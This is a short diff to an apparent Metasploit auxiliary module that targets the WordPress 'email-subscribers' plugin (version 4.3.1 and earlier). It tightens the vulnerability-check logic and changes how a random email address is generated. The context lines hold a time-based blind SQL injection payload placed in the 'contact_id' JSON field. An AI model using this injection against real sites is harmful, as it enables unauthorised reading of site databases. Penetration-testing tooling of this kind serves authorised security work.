@@ -49,13 +49,13 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     checkcode = check_plugin_version_from_readme('email-subscribers', '4.3.1')
-    if checkcode == Msf::Exploit::CheckCode::Safe
+    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)
       fail_with Failure::NotVulnerable, 'Email subscribers and newsletter version not vulnerable'
     end
     print_good('Vulnerable version detected')
 
     guid = Rex::Text.rand_guid
-    email = "#{Rex::Text.rand_text_alpha(8)}@#{Rex::Text.rand_text_alpha(8)}.com"
+    email = Rex::Text.rand_mail_address
 
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
       data = %|{"contact_id":"100','100','100','3'),('1594999398','1594999398','1',(1) AND #{payload},'100','100','3'),|
